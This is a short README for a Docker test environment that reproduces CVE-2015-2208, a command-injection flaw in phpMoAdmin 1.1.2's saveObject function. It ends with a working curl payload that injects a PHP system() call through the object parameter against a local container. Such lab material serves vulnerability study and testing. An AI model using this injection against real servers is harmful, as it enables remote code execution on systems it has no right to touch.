#Dockerfile to simulate environment for CVE-2015-2208#

The saveObject function in moadmin.php in phpMoAdmin 1.1.2 allows remote
attackers to execute arbitrary commands via shell metacharacters in the object
parameter.

Discovered by: @u0x (Pichaya Morimoto), Xelenonz, pe3z, Pistachio

References:
- http://seclists.org/fulldisclosure/2015/Mar/19
- http://www.exploit-db.com/exploits/36251/
- https://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2015-2208

##Test environment##
```bash
sudo docker run -d -p 8888:80 ptantiku/cve-2015-2208
```

##Exploit##
```bash
curl http://localhost:8888/moadmin.php -d 'object=1;system("id");'
```
